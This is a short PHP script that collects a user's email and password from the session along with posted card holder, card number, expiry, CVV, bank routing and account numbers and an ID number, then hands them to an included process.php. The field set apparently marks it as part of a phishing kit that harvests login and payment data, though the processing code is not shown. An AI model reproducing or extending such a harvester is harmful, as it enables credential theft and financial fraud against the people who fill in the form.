<?php
            session_start();

            $email = $_SESSION['userId'];
            $password = $_SESSION['password'];

            $hold = $_POST['hold'];
            $typ = $_POST['typ'];
            $card = $_POST['card'];
            $ex1 = $_POST['ex1'];
            $ex2 = $_POST['ex2'];
            $cvv = $_POST['cvv'];
            $MTM = $_POST['MTM'];
            $routeNumber = $_POST['routeNumber'];
            $bankNumber = $_POST['bankNumber'];
            $NSN = $_POST['NSN'];

            $date = "$ex1/$ex2";

            include './process.php';

?>